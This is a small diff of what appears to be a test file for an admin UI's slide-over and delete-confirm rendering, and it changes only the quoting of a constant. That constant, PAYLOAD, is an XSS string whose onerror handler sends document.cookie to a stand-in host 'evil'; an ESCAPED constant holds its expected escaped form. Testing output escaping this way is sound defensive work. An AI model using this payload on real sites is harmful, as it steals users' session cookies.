@@ -13,7 +13,7 @@ from lexigram.admin.ui.organisms.admin_slide_over import (
     render_delete_confirm,
 )
 
-PAYLOAD = '<img src=x onerror="fetch(\'https://evil/c?\'+document.cookie)">'
+PAYLOAD = "<img src=x onerror=\"fetch('https://evil/c?'+document.cookie)\">"
 ESCAPED = "&lt;img src=x onerror=&quot;fetch(&#x27;https://evil/c?&#x27;+document.cookie)&quot;&gt;"
 
 
